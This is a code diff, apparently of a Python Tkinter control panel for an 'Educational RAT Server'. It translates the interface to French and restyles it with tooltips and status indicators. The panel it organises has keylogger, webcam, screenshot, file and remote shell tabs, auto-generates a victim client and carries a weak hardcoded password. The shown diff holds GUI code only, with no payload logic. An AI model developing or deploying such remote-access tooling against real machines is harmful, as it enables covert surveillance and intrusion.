@@ -21,9 +21,9 @@ except ImportError:
     try:
         import Image, ImageTk
     except ImportError:
-        print("ERROR: PIL/Pillow could not be imported despite being installed.")
-        print("This might be a Python path issue. Please make sure PIL is installed with:")
-        print("pip install pillow")
+        print("ERREUR : PIL/Pillow ne peut pas être importé malgré l'installation.")
+        print("Problème possible de chemin Python. Installez PIL avec :")
+        print("    pip install pillow")
         PIL_AVAILABLE = False
     else:
         PIL_AVAILABLE = True
@@ -48,6 +48,54 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
+
+# ─────────────────────────────────────────────
+# ToolTip — infobulle au survol des boutons
+# ─────────────────────────────────────────────
+class ToolTip:
+    """Affiche une infobulle lorsque la souris survole un widget."""
+
+    def __init__(self, widget, text, bg="#4C566A", fg="#ECEFF4", delay=600):
+        self.widget = widget
+        self.text = text
+        self.bg = bg
+        self.fg = fg
+        self.delay = delay  # ms avant affichage
+        self._tip_window = None
+        self._job = None
+        widget.bind("<Enter>", self._schedule)
+        widget.bind("<Leave>", self._hide)
+        widget.bind("<ButtonPress>", self._hide)
+
+    def _schedule(self, event=None):
+        self._job = self.widget.after(self.delay, self._show)
+
+    def _show(self):
+        if self._tip_window:
+            return
+        x = self.widget.winfo_rootx() + 20
+        y = self.widget.winfo_rooty() + self.widget.winfo_height() + 4
+        self._tip_window = tw = tk.Toplevel(self.widget)
+        tw.wm_overrideredirect(True)
+        tw.wm_geometry(f"+{x}+{y}")
+        tw.attributes("-topmost", True)
+        frame = tk.Frame(tw, bg=self.bg, bd=1, relief="solid")
+        frame.pack()
+        lbl = tk.Label(
+            frame, text=self.text, bg=self.bg, fg=self.fg,
+            font=("Segoe UI", 9), justify="left", padx=8, pady=4,
+            wraplength=280
+        )
+        lbl.pack()
+
+    def _hide(self, event=None):
+        if self._job:
+            self.widget.after_cancel(self._job)
+            self._job = None
+        if self._tip_window:
+            self._tip_window.destroy()
+            self._tip_window = None
+
 # Global variables for server operation
 clients = {}
 current_client = None
@@ -63,93 +111,139 @@ AUTH_PASSWORD = "password"
 class RATServerGUI:
     def __init__(self, root):
         self.root = root
-        self.root.title("Educational RAT Server - 🛡 EDUCATIONAL USE ONLY")
-        self.root.geometry("1000x700")
-        self.root.minsize(800, 600)
-        
+        self.root.title("🛡️ Educational RAT Server — Usage pédagogique uniquement")
+        self.root.geometry("1100x750")
+        self.root.minsize(900, 620)
+
         # Set application icon
         if platform.system() == "Windows":
             self.root.iconbitmap("icon.ico") if os.path.exists("icon.ico") else None
-        
-        # Set theme and colors
-        self.bg_color = "#2E3440"  # Dark blue-gray
-        self.text_color = "#ECEFF4"  # Off white
-        self.accent_color = "#88C0D0"  # Light blue
-        self.warning_color = "#EBCB8B"  # Yellow
-        self.error_color = "#BF616A"  # Red
-        self.success_color = "#A3BE8C"  # Green
-        
-        # Configure style
+
+        # ── Palette de couleurs (thème Nord enrichi) ──────────────────────────
+        self.bg_color      = "#2E3440"   # Fond principal (gris-bleu foncé)
+        self.panel_color   = "#3B4252"   # Fond des panneaux
+        self.border_color  = "#4C566A"   # Bordures / séparateurs
+        self.text_color    = "#ECEFF4"   # Texte principal
+        self.muted_color   = "#D8DEE9"   # Texte secondaire
+        self.accent_color  = "#88C0D0"   # Bleu clair (accent)
+        self.highlight_color = "#5E81AC" # Bleu foncé (sélection)
+        self.success_color = "#A3BE8C"   # Vert (succès)
+        self.warning_color = "#EBCB8B"   # Jaune (avertissement)
+        self.error_color   = "#BF616A"   # Rouge (erreur)
+        self.info_color    = "#81A1C1"   # Bleu moyen (info)
+        self.banner_bg     = "#BF616A"   # Fond du bandeau éthique
+        self.banner_fg     = "#ECEFF4"   # Texte du bandeau éthique
+
+        # ── Configuration du style ────────────────────────────────────────────
         self.style = ttk.Style()
-        self.style.theme_use('clam')  # Use a modern theme as base
-        
-        # Configure colors for various widgets
+        self.style.theme_use('clam')
+
         self.root.configure(bg=self.bg_color)
-        self.style.configure("TFrame", background=self.bg_color)
-        self.style.configure("TButton", 
-                             background=self.accent_color, 
-                             foreground=self.bg_color, 
-                             font=("Segoe UI", 10, "bold"))
-        self.style.configure("TLabel", 
-                             background=self.bg_color, 
-                             foreground=self.text_color, 
-                             font=("Segoe UI", 10))
-        self.style.configure("Bold.TLabel", 
-                             background=self.bg_color, 
-                             foreground=self.text_color, 
-                             font=("Segoe UI", 12, "bold"))
-        self.style.configure("Header.TLabel", 
-                             background=self.bg_color, 
-                             foreground=self.accent_color, 
-                             font=("Segoe UI", 14, "bold"))
-        self.style.configure("Status.TLabel", 
-                             background=self.bg_color, 
-                             foreground=self.success_color, 
-                             font=("Segoe UI", 10))
-        self.style.configure("Warning.TLabel", 
-                             background=self.bg_color, 
-                             foreground=self.warning_color, 
-                             font=("Segoe UI", 12, "bold"))
+
+        # Frames et labels
+        self.style.configure("TFrame",         background=self.bg_color)
+        self.style.configure("Panel.TFrame",   background=self.panel_color)
+        self.style.configure("TLabel",
+            background=self.bg_color, foreground=self.text_color,
+            font=("Segoe UI", 10))
+        self.style.configure("Muted.TLabel",
+            background=self.bg_color, foreground=self.muted_color,
+            font=("Segoe UI", 9))
+        self.style.configure("Bold.TLabel",
+            background=self.bg_color, foreground=self.text_color,
+            font=("Segoe UI", 11, "bold"))
+        self.style.configure("Header.TLabel",
+            background=self.bg_color, foreground=self.accent_color,
+            font=("Segoe UI", 14, "bold"))
+        self.style.configure("Status.TLabel",
+            background=self.bg_color, foreground=self.success_color,
+            font=("Segoe UI", 10))
+        self.style.configure("Warning.TLabel",
+            background=self.bg_color, foreground=self.warning_color,
+            font=("Segoe UI", 12, "bold"))
+        self.style.configure("Error.TLabel",
+            background=self.bg_color, foreground=self.error_color,
+            font=("Segoe UI", 10))
+
+        # Boutons (variantes sémantiques)
+        self.style.configure("TButton",
+            background=self.accent_color, foreground=self.bg_color,
+            font=("Segoe UI", 10, "bold"), relief="flat", padding=(8, 4))
+        self.style.map("TButton",
+            background=[("active", self.highlight_color), ("disabled", self.border_color)],
+            foreground=[("active", "#ECEFF4"), ("disabled", self.muted_color)])
+
+        self.style.configure("Success.TButton",
+            background=self.success_color, foreground=self.bg_color,
+            font=("Segoe UI", 10, "bold"), relief="flat", padding=(8, 4))
+        self.style.map("Success.TButton",
+            background=[("active", "#8FAF7A"), ("disabled", self.border_color)])
+
+        self.style.configure("Danger.TButton",
+            background=self.error_color, foreground="#ECEFF4",
+            font=("Segoe UI", 10, "bold"), relief="flat", padding=(8, 4))
+        self.style.map("Danger.TButton",
+            background=[("active", "#A0505A"), ("disabled", self.border_color)])
+
+        self.style.configure("Warning.TButton",
+            background=self.warning_color, foreground=self.bg_color,
+            font=("Segoe UI", 10, "bold"), relief="flat", padding=(8, 4))
+        self.style.map("Warning.TButton",
+            background=[("active", "#C9AA6A"), ("disabled", self.border_color)])
+
+        self.style.configure("TLabelframe",
+            background=self.bg_color, foreground=self.accent_color,
+            relief="groove", borderwidth=1)
+        self.style.configure("TLabelframe.Label",
+            background=self.bg_color, foreground=self.accent_color,
+            font=("Segoe UI", 10, "bold"))
+
+        self.style.configure("TNotebook",
+            background=self.bg_color, borderwidth=0)
+        self.style.configure("TNotebook.Tab",
+            background=self.panel_color, foreground=self.muted_color,
+            font=("Segoe UI", 10), padding=(12, 6))
+        self.style.map("TNotebook.Tab",
+            background=[("selected", self.bg_color)],
+            foreground=[("selected", self.accent_color)])
+
+        self.style.configure("TCombobox",
+            fieldbackground=self.panel_color, background=self.panel_color,
+            foreground=self.text_color, selectbackground=self.highlight_color)
+        self.style.configure("TEntry",
+            fieldbackground=self.panel_color, foreground=self.text_color,
+            insertcolor=self.text_color)
+        self.style.configure("TCheckbutton",
+            background=self.bg_color, foreground=self.text_color,
+            font=("Segoe UI", 10))
+        self.style.configure("TSeparator",
+            background=self.border_color)
         
-        # Create ethical use warning banner at the top
+        # ── Bandeau éthique ───────────────────────────────────────────────────
         self.create_ethical_banner()
-        
-        # Setup tabs
+
+        # ── Onglets (avec emojis pour navigation rapide) ──────────────────────
         self.tab_control = ttk.Notebook(self.root)
-        
-        # Main control tab
-        self.tab_control_frame = ttk.Frame(self.tab_control)
-        self.tab_control.add(self.tab_control_frame, text="Control Panel")
-        
-        # File operations tab
-        self.tab_file_frame = ttk.Frame(self.tab_control)
-        self.tab_control.add(self.tab_file_frame, text="File Operations")
-        
-        # Screenshot tab
+
+        self.tab_control_frame    = ttk.Frame(self.tab_control)
+        self.tab_file_frame       = ttk.Frame(self.tab_control)
         self.tab_screenshot_frame = ttk.Frame(self.tab_control)
-        self.tab_control.add(self.tab_screenshot_frame, text="Screenshots")
-        
-        # System info tab
-        self.tab_sysinfo_frame = ttk.Frame(self.tab_control)
-        self.tab_control.add(self.tab_sysinfo_frame, text="System Info")
-        
-        # Settings tab
-        self.tab_settings_frame = ttk.Frame(self.tab_control)
-        self.tab_control.add(self.tab_settings_frame, text="Settings")
-        
-        # Webcam tab
-        self.tab_webcam_frame = ttk.Frame(self.tab_control)
-        self.tab_control.add(self.tab_webcam_frame, text="Webcam")
-        
-        # Keylogger tab
-        self.tab_keylogger_frame = ttk.Frame(self.tab_control)
-        self.tab_control.add(self.tab_keylogger_frame, text="Keylogger")
-        
-        # Help tab
-        self.tab_help_frame = ttk.Frame(self.tab_control)
-        self.tab_control.add(self.tab_help_frame, text="Help")
-        
-        self.tab_control.pack(expand=1, fill="both", padx=10, pady=10)
+        self.tab_sysinfo_frame    = ttk.Frame(self.tab_control)
+        self.tab_settings_frame   = ttk.Frame(self.tab_control)
+        self.tab_webcam_frame     = ttk.Frame(self.tab_control)
+        self.tab_keylogger_frame  = ttk.Frame(self.tab_control)
+        self.tab_help_frame       = ttk.Frame(self.tab_control)
+
+        self.tab_control.add(self.tab_control_frame,    text="🖥️  Panneau de contrôle")
+        self.tab_control.add(self.tab_file_frame,       text="📁  Fichiers")
+        self.tab_control.add(self.tab_screenshot_frame, text="📸  Captures d'écran")
+        self.tab_control.add(self.tab_sysinfo_frame,    text="🔍  Infos système")
+        self.tab_control.add(self.tab_settings_frame,   text="⚙️  Paramètres")
+        self.tab_control.add(self.tab_webcam_frame,     text="📷  Webcam")
+        self.tab_control.add(self.tab_keylogger_frame,  text="⌨️  Keylogger")
+        self.tab_control.add(self.tab_help_frame,       text="❓  Aide")
+
+        self.tab_control.pack(expand=1, fill="both", padx=10, pady=(0, 10))
         
         # Initialize server settings
         self.server_host = tk.StringVar(value="0.0.0.0")
@@ -188,137 +282,199 @@ class RATServerGUI:
         self.setup_keylogger_panel()
         self.setup_help_panel()
         
-        # Start response processing thread
+        # Démarrage du thread de traitement des réponses
         self.response_thread = threading.Thread(target=self.process_responses, daemon=True)
         self.response_thread.start()
-        
-        # Show welcome message
-        self.log_message("Welcome to the Educational RAT Server GUI", "info")
-        self.log_message("IMPORTANT: This tool is for educational purposes only", "warning")
-        self.log_message("Use in authorized test environments only", "warning")
-        
-        # Setup window close handler
+
+        # Messages de bienvenue
+        self.log_message("Bienvenue dans l'interface du serveur RAT éducatif.", "info")
+        self.log_message("IMPORTANT : Cet outil est réservé à un usage éducatif uniquement.", "warning")
+        self.log_message("Utilisez-le uniquement dans des environnements de test autorisés.", "warning")
+        self.log_message("─" * 60, "info")
+        self.log_message("Pour commencer : cliquez sur '▶ Démarrer le serveur'.", "info")
+
+        # Gestionnaire de fermeture de fenêtre
         self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
     
     def create_ethical_banner(self):
-        """Create a visible ethical use warning banner"""
-        banner_frame = ttk.Frame(self.root)
-        banner_frame.pack(fill="x", padx=5, pady=5)
-        
-        warning_text = "🛡 EDUCATIONAL USE ONLY - UNAUTHORIZED USE IS ILLEGAL 🛡"
-        warning_label = ttk.Label(banner_frame, text=warning_text, style="Warning.TLabel")
-        warning_label.pack(fill="x", pady=5)
-        
-        separator = ttk.Separator(self.root, orient="horizontal")
-        separator.pack(fill="x", padx=5, pady=5)
+        """Bandeau d'avertissement éthique visible et impactant."""
+        # Fond coloré pour attirer l'attention
+        banner_frame = tk.Frame(self.root, bg=self.banner_bg, pady=6)
+        banner_frame.pack(fill="x", padx=0, pady=0)
+
+        inner = tk.Frame(banner_frame, bg=self.banner_bg)
+        inner.pack()
+
+        icon_lbl = tk.Label(inner, text="⚠️", bg=self.banner_bg,
+                            font=("Segoe UI", 14), fg=self.banner_fg)
+        icon_lbl.pack(side=tk.LEFT, padx=(0, 6))
+
+        msg_lbl = tk.Label(
+            inner,
+            text="USAGE PÉDAGOGIQUE UNIQUEMENT — Toute utilisation non autorisée est illégale.",
+            bg=self.banner_bg, fg=self.banner_fg,
+            font=("Segoe UI", 11, "bold")
+        )
+        msg_lbl.pack(side=tk.LEFT)
+
+        icon_lbl2 = tk.Label(inner, text="⚠️", bg=self.banner_bg,
+                             font=("Segoe UI", 14), fg=self.banner_fg)
+        icon_lbl2.pack(side=tk.LEFT, padx=(6, 0))
+
+        # Fine ligne de séparation sous le bandeau
+        sep = tk.Frame(self.root, bg=self.border_color, height=1)
+        sep.pack(fill="x")
     
     def setup_control_panel(self):
-        """Set up the main control panel tab"""
+        """Configure le panneau de contrôle principal."""
         control_frame = self.tab_control_frame
-        
-        # Split into left panel (clients) and right panel (command console)
+
         panel_frame = ttk.Frame(control_frame)
         panel_frame.pack(fill="both", expand=True, padx=5, pady=5)
-        
-        # Left panel - Client list
+
+        # ─── Panneau gauche : liste des clients ───────────────────────────────
         left_frame = ttk.Frame(panel_frame, width=300)
         left_frame.pack(side=tk.LEFT, fill="both", padx=5, pady=5)
-        
-        # Client list header
-        client_header = ttk.Label(left_frame, text="Connected Clients", style="Header.TLabel")
-        client_header.pack(pady=(0, 10), anchor="w")
-        
-        # Client listbox with scrollbar
+
+        client_header = ttk.Label(left_frame, text="🖥️  Clients connectés", style="Header.TLabel")
+        client_header.pack(pady=(0, 8), anchor="w")
+
+        # Liste des clients
         client_frame = ttk.Frame(left_frame)
         client_frame.pack(fill="both", expand=True)
-        
-        self.client_listbox = tk.Listbox(client_frame, bg="#3B4252", fg=self.text_color,
-                                         font=("Segoe UI", 10), selectbackground=self.accent_color)
+
+        self.client_listbox = tk.Listbox(
+            client_frame, bg=self.panel_color, fg=self.text_color,
+            font=("Segoe UI", 10), selectbackground=self.highlight_color,
+            selectforeground="#ECEFF4", relief="flat", bd=0,
+            activestyle="none", highlightthickness=1,
+            highlightcolor=self.border_color, highlightbackground=self.border_color
+        )
         self.client_listbox.pack(side=tk.LEFT, fill="both", expand=True)
-        
-        client_scrollbar = ttk.Scrollbar(client_frame, orient="vertical", 
-                                        command=self.client_listbox.yview)
+
+        client_scrollbar = ttk.Scrollbar(client_frame, orient="vertical",
+                                         command=self.client_listbox.yview)
         client_scrollbar.pack(side=tk.RIGHT, fill="y")
         self.client_listbox.config(yscrollcommand=client_scrollbar.set)
-        
-        # Client buttons
+
+        # Boutons de gestion des clients
         client_button_frame = ttk.Frame(left_frame)
-        client_button_frame.pack(fill="x", pady=10)
-        
-        self.refresh_btn = ttk.Button(client_button_frame, text="Refresh", 
-                                     command=self.refresh_clients)
-        self.refresh_btn.pack(side=tk.LEFT, padx=5)
-        
-        self.connect_btn = ttk.Button(client_button_frame, text="Connect", 
-                                     command=self.connect_to_client)
-        self.connect_btn.pack(side=tk.LEFT, padx=5)
-        
-        self.disconnect_btn = ttk.Button(client_button_frame, text="Disconnect", 
-                                        command=self.disconnect_client)
-        self.disconnect_btn.pack(side=tk.LEFT, padx=5)
-        
-        # Server control buttons
+        client_button_frame.pack(fill="x", pady=(8, 4))
+
+        self.refresh_btn = ttk.Button(client_button_frame, text="🔄 Actualiser",
+                                      command=self.refresh_clients)
+        self.refresh_btn.pack(side=tk.LEFT, padx=(0, 4))
+        ToolTip(self.refresh_btn, "Actualise la liste des clients connectés au serveur.")
+
+        self.connect_btn = ttk.Button(client_button_frame, text="▶ Connecter",
+                                      command=self.connect_to_client,
+                                      style="Success.TButton")
+        self.connect_btn.pack(side=tk.LEFT, padx=4)
+        ToolTip(self.connect_btn,
+                "Sélectionnez un client dans la liste puis cliquez ici\n"
+                "pour commencer à lui envoyer des commandes.")
+
+        self.disconnect_btn = ttk.Button(client_button_frame, text="⏹ Déconnecter",
+                                         command=self.disconnect_client,
+                                         style="Danger.TButton")
+        self.disconnect_btn.pack(side=tk.LEFT, padx=4)
+        ToolTip(self.disconnect_btn,
+                "Ferme la connexion avec le client actuellement sélectionné.")
+
+        # Boutons de contrôle du serveur
         server_button_frame = ttk.Frame(left_frame)
-        server_button_frame.pack(fill="x", pady=10)
-        
-        self.start_server_btn = ttk.Button(server_button_frame, text="Start Server", 
-                                         command=self.start_server)
-        self.start_server_btn.pack(side=tk.LEFT, padx=5)
-        
-        self.stop_server_btn = ttk.Button(server_button_frame, text="Stop Server", 
-                                        command=self.stop_server)
-        self.stop_server_btn.pack(side=tk.LEFT, padx=5)
+        server_button_frame.pack(fill="x", pady=6)
+
+        self.start_server_btn = ttk.Button(server_button_frame, text="▶ Démarrer le serveur",
+                                           command=self.start_server,
+                                           style="Success.TButton")
+        self.start_server_btn.pack(side=tk.LEFT, padx=(0, 4))
+        ToolTip(self.start_server_btn,
+                "Démarre le serveur et commence à écouter les connexions\n"
+                "entrantes sur le port configuré dans Paramètres.")
+
+        self.stop_server_btn = ttk.Button(server_button_frame, text="■ Arrêter",
+                                          command=self.stop_server,
+                                          style="Danger.TButton")
+        self.stop_server_btn.pack(side=tk.LEFT, padx=4)
         self.stop_server_btn.config(state="disabled")
-        
-        # Connection status indicator (with color)
+        ToolTip(self.stop_server_btn,
+                "Arrête le serveur et déconnecte tous les clients.")
+
+        # Zone de statut avec grand indicateur visuel
         status_frame = ttk.Frame(left_frame)
-        status_frame.pack(fill="x", pady=10)
-        
-        self.status_var = tk.StringVar(value="Server: Stopped")
-        self.status_label = ttk.Label(status_frame, textvariable=self.status_var, 
-                                    style="Status.TLabel")
-        self.status_label.pack(side=tk.LEFT, pady=5)
-        
-        # Add visual indicator for connection status
-        self.status_indicator = tk.Canvas(status_frame, width=20, height=20, 
-                                        bg=self.bg_color, highlightthickness=0)
-        self.status_indicator.pack(side=tk.LEFT, padx=5)
-        self.status_indicator.create_oval(2, 2, 18, 18, fill=self.error_color, tags="indicator")
-        
-        # Client count display
-        self.client_count_var = tk.StringVar(value="Clients: 0")
-        self.client_count_label = ttk.Label(status_frame, textvariable=self.client_count_var, 
-                                         style="Status.TLabel")
-        self.client_count_label.pack(side=tk.RIGHT, pady=5)
-        
-        # Right panel - Command console
+        status_frame.pack(fill="x", pady=8)
+
+        self.status_var = tk.StringVar(value="🔴  Serveur arrêté")
+        self.status_label = ttk.Label(status_frame, textvariable=self.status_var,
+                                      style="Status.TLabel")
+        self.status_label.pack(side=tk.LEFT, pady=4)
+
+        # Indicateur circulaire (plus grand : 30x30)
+        self.status_indicator = tk.Canvas(status_frame, width=30, height=30,
+                                          bg=self.bg_color, highlightthickness=0)
+        self.status_indicator.pack(side=tk.LEFT, padx=6)
+        self.status_indicator.create_oval(3, 3, 27, 27, fill=self.error_color,
+                                          outline="", tags="indicator")
+
+        self.client_count_var = tk.StringVar(value="👥  Clients : 0")
+        self.client_count_label = ttk.Label(status_frame, textvariable=self.client_count_var,
+                                            style="Muted.TLabel")
+        self.client_count_label.pack(side=tk.RIGHT, pady=4)
+
+        # ─── Panneau droit : console de commandes ─────────────────────────────
         right_frame = ttk.Frame(panel_frame)
         right_frame.pack(side=tk.RIGHT, fill="both", expand=True, padx=5, pady=5)
-        
-        # Console header
-        console_header = ttk.Label(right_frame, text="Command Console", style="Header.TLabel")
-        console_header.pack(pady=(0, 10), anchor="w")
-        
-        # Console output
-        self.console_output = scrolledtext.ScrolledText(right_frame, wrap=tk.WORD, 
-                                                      bg="#3B4252", fg=self.text_color,
-                                                      font=("Consolas", 10))
-        self.console_output.pack(fill="both", expand=True, pady=5)
+
+        # En-tête console avec bouton Effacer
+        console_header_frame = ttk.Frame(right_frame)
+        console_header_frame.pack(fill="x", pady=(0, 6))
+
+        console_header = ttk.Label(console_header_frame, text="💻  Console de commandes",
+                                   style="Header.TLabel")
+        console_header.pack(side=tk.LEFT)
+
+        clear_btn = ttk.Button(console_header_frame, text="🗑 Effacer",
+                               command=self._clear_console)
+        clear_btn.pack(side=tk.RIGHT)
+        ToolTip(clear_btn, "Efface tout le contenu de la console.")
+
+        # Zone de sortie de la console
+        self.console_output = scrolledtext.ScrolledText(
+            right_frame, wrap=tk.WORD,
+            bg=self.panel_color, fg=self.text_color,
+            font=("Consolas", 10), relief="flat",
+            insertbackground=self.text_color
+        )
+        self.console_output.pack(fill="both", expand=True, pady=4)
         self.console_output.config(state="disabled")
-        
-        # Command entry
+
+        # Champ de saisie des commandes
         cmd_frame = ttk.Frame(right_frame)
-        cmd_frame.pack(fill="x", pady=5)
-        
-        cmd_label = ttk.Label(cmd_frame, text="Command:", style="TLabel")
-        cmd_label.pack(side=tk.LEFT, padx=(0, 5))
-        
-        self.cmd_entry = ttk.Entry(cmd_frame, font=("Segoe UI", 10), width=50)
-        self.cmd_entry.pack(side=tk.LEFT, fill="x", expand=True, padx=5)
+        cmd_frame.pack(fill="x", pady=4)
+
+        cmd_label = ttk.Label(cmd_frame, text="❯", style="Bold.TLabel")
+        cmd_label.pack(side=tk.LEFT, padx=(0, 6))
+
+        self.cmd_entry = ttk.Entry(cmd_frame, font=("Consolas", 10), width=50)
+        self.cmd_entry.pack(side=tk.LEFT, fill="x", expand=True, padx=(0, 6))
         self.cmd_entry.bind("<Return>", self.send_command)
-        
-        self.send_btn = ttk.Button(cmd_frame, text="Send", command=self.send_command)
-        self.send_btn.pack(side=tk.RIGHT, padx=5)
+        ToolTip(self.cmd_entry,
+                "Saisissez une commande et appuyez sur Entrée ou cliquez sur Envoyer.\n"
+                "Exemple : sysinfo, screenshot, shell dir")
+
+        self.send_btn = ttk.Button(cmd_frame, text="Envoyer ➤", command=self.send_command)
+        self.send_btn.pack(side=tk.RIGHT)
+        ToolTip(self.send_btn,
+                "Envoie la commande au client sélectionné.\n"
+                "Assurez-vous qu'un client est connecté et sélectionné.")
+
+    def _clear_console(self):
+        """Efface le contenu de la console."""
+        self.console_output.config(state="normal")
+        self.console_output.delete("1.0", tk.END)
+        self.console_output.config(state="disabled")
+        self.log_message("Console effacée.", "info")
 
     def setup_file_operations(self):
         """Set up the file operations tab"""
@@ -1059,134 +1215,151 @@ This tool is intended ONLY for educational purposes to understand security conce
                 self.log_message(f"Error saving keylogger data: {e}", "error")
     
     def update_status_indicator(self, status="idle"):
-        """Update the visual status indicator"""
-        self.status_indicator.delete("indicator")
-        
+        """Met à jour l'indicateur visuel de statut du serveur."""
+        self.status_indicator.delete("all")
+
         if status == "idle":
-            # Red indicator - not running
             color = self.error_color
-            self.status_var.set("Server: Stopped")
+            self.status_var.set("🔴  Serveur arrêté")
         elif status == "listening":
-            # Yellow indicator - listening but no clients
             color = self.warning_color
-            self.status_var.set(f"Server: Running on {self.server_host.get()}:{self.server_port.get()}")
+            self.status_var.set(f"🟡  En écoute : {self.server_host.get()}:{self.server_port.get()}")
         elif status == "connected":
-            # Green indicator - clients connected
             color = self.success_color
-            self.status_var.set(f"Server: Running with clients")
-        
-        # Draw the indicator
-        self.status_indicator.create_oval(2, 2, 18, 18, fill=color, tags="indicator")
-        
-        # Update client count
+            count = len(clients)
+            self.status_var.set(f"🟢  Connecté — {count} client(s)")
+
+        # Grand cercle de statut
+        self.status_indicator.create_oval(3, 3, 27, 27, fill=color, outline="", tags="indicator")
+        # Halo extérieur semi-transparent
+        self.status_indicator.create_oval(1, 1, 29, 29, outline=color, width=1, tags="indicator")
+
+        # Mise à jour du compteur de clients
         client_count = len(clients)
-        self.client_count_var.set(f"Clients: {client_count}")
-        
-        # If we now have clients, update status
+        self.client_count_var.set(f"👥  Clients : {client_count}")
+
         if status == "listening" and client_count > 0:
             self.update_status_indicator("connected")
 
     # Placeholder method stubs for functionality
     def log_message(self, message, level="info"):
+        """Affiche un message dans la console avec horodatage et icône de niveau."""
         self.console_output.config(state="normal")
-        
+
+        timestamp = time.strftime("%H:%M:%S")
+
         if level == "info":
-            tag = "info"
-            prefix = "[INFO] "
-            color = self.text_color
+            tag    = "info"
+            prefix = f"[{timestamp}] ℹ️  "
+            color  = self.info_color
         elif level == "success":
-            tag = "success"
-            prefix = "[SUCCESS] "
-            color = self.success_color
+            tag    = "success"
+            prefix = f"[{timestamp}] ✅  "
+            color  = self.success_color
         elif level == "warning":
-            tag = "warning"
-            prefix = "[WARNING] "
-            color = self.warning_color
+            tag    = "warning"
+            prefix = f"[{timestamp}] ⚠️  "
+            color  = self.warning_color
         elif level == "error":
-            tag = "error"
-            prefix = "[ERROR] "
-            color = self.error_color
-        
+            tag    = "error"
+            prefix = f"[{timestamp}] ❌  "
+            color  = self.error_color
+        else:
+            tag    = "info"
+            prefix = f"[{timestamp}] •  "
+            color  = self.text_color
+
         self.console_output.tag_config(tag, foreground=color)
         self.console_output.insert(tk.END, f"{prefix}{message}\n", tag)
         self.console_output.see(tk.END)
         self.console_output.config(state="disabled")
     
     def start_server(self):
-        """Start the RAT server"""
-        self.log_message("Starting server...", "info")
-        
-        # Get the current IP configuration
+        """Démarre le serveur RAT."""
+        # Validation du port
+        try:
+            port = self.server_port.get()
+            if not (1 <= port <= 65535):
+                raise ValueError()
+        except (ValueError, tk.TclError):
+            messagebox.showerror(
+                "Port invalide",
+                "❌ Le numéro de port est invalide.\n\n"
+                "Le port doit être un entier entre 1 et 65535.\n"
+                "Valeur recommandée : 4444 (ou tout port > 1024 non utilisé)."
+            )
+            return
+
+        self.log_message("Démarrage du serveur en cours...", "info")
+
         local_ip = self.get_local_ip()
-        
-        # Update status indicator
         self.update_status_indicator("listening")
-        
-        # Check if trying to use 127.0.0.1 with LAN mode
+
+        # Avertissement sur localhost + mode LAN
         if self.lan_mode_var.get() and (self.server_host.get() in ['127.0.0.1', 'localhost']):
-            self.log_message("Warning: Using localhost with LAN mode enabled may cause connection issues", "warning")
-            self.log_message("Consider using 0.0.0.0 to listen on all interfaces", "warning")
-        
-        # Placeholder for actual server implementation
-        self.status_var.set(f"Server: Running on {self.server_host.get()}:{self.server_port.get()}")
-        self.log_message(f"Server listening on {self.server_host.get()}:{self.server_port.get()}", "success")
-        
-        # Show all detected IPs for user reference
+            self.log_message(
+                "Attention : l'adresse localhost (127.0.0.1) est configurée avec le mode LAN activé.\n"
+                "  → Les clients sur d'autres machines ne pourront pas se connecter.\n"
+                "  → Utilisez 0.0.0.0 pour écouter sur toutes les interfaces réseau.",
+                "warning"
+            )
+
+        self.status_var.set(f"🟡  En écoute : {self.server_host.get()}:{self.server_port.get()}")
+        self.log_message(
+            f"Serveur en écoute sur {self.server_host.get()}:{self.server_port.get()}",
+            "success"
+        )
+
+        # Affichage des IPs disponibles
         ip_info = self.get_all_ip_info()
-        self.log_message(f"Your hostname: {ip_info['hostname']}", "info")
-        self.log_message(f"Your local IP address: {local_ip}", "info")
-        
+        self.log_message(f"Nom d'hôte : {ip_info['hostname']}", "info")
+        self.log_message(f"IP locale principale : {local_ip}", "info")
+
         if self.server_host.get() == "0.0.0.0":
-            self.log_message("Server is listening on all network interfaces", "info")
-            self.log_message(f"Clients should connect to one of:", "info")
-            
-            # List all possible IPs clients could use
-            self.log_message(f"  • {local_ip} (recommended for LAN)", "info")
-            
+            self.log_message("Le serveur écoute sur toutes les interfaces réseau.", "info")
+            self.log_message("Les clients peuvent se connecter via :", "info")
+            self.log_message(f"  • {local_ip} (recommandé pour le réseau local)", "info")
             for ip in ip_info['local_ips']:
                 if ip != local_ip and not ip.startswith("127."):
                     self.log_message(f"  • {ip}", "info")
-            
-            self.log_message(f"  • 127.0.0.1 (only for clients on this machine)", "info")
-        
+            self.log_message("  • 127.0.0.1 (uniquement si client et serveur sont sur la même machine)", "info")
+
         self.start_server_btn.config(state="disabled")
         self.stop_server_btn.config(state="normal")
-        
-        # Start connectivity checker in a separate thread
+
+        # Monitoring de connectivité
         self.connection_monitor_thread = threading.Thread(
-            target=self.check_server_connectivity, 
+            target=self.check_server_connectivity,
             daemon=True
         )
         self.connection_monitor_thread.start()
-        
-        # Auto-generate client if option is enabled
+
+        # Génération automatique du client si activée
         if self.auto_generate_var.get():
             ip_to_use = local_ip if self.lan_mode_var.get() else "127.0.0.1"
             if self.generate_client_script(ip_to_use, self.server_port.get()):
                 self.client_generated = True
-                self.log_message("client_gen.py generated automatically", "success")
-                
-                # Build executable if option is selected
+                self.log_message("client_gen.py généré automatiquement.", "success")
                 if self.build_exe_var.get():
                     if self.build_client_executable():
-                        self.log_message("Executable built automatically", "success")
+                        self.log_message("Exécutable construit automatiquement.", "success")
     
     def stop_server(self):
-        """Stop the RAT server"""
-        self.log_message("Stopping server...", "info")
-        
-        # Update status indicator
+        """Arrête le serveur RAT."""
+        self.log_message("Arrêt du serveur en cours...", "info")
         self.update_status_indicator("idle")
-        
-        # Placeholder for actual server stop implementation
-        self.status_var.set("Server: Stopped")
-        self.log_message("Server stopped", "warning")
+        self.status_var.set("🔴  Serveur arrêté")
+        self.log_message("Serveur arrêté. Toutes les connexions ont été fermées.", "warning")
         self.start_server_btn.config(state="normal")
         self.stop_server_btn.config(state="disabled")
     
     def on_closing(self):
-        """Handle window closing event"""
-        if messagebox.askokcancel("Exit", "Are you sure you want to exit?"):
+        """Gère la fermeture de la fenêtre."""
+        if messagebox.askokcancel(
+            "Quitter",
+            "Êtes-vous sûr de vouloir quitter ?\n"
+            "Toutes les connexions actives seront fermées."
+        ):
             if self.server:
                 self.stop_server()
             self.root.destroy()
@@ -1196,25 +1369,458 @@ This tool is intended ONLY for educational purposes to understand security conce
         # Placeholder for actual implementation
         pass
     
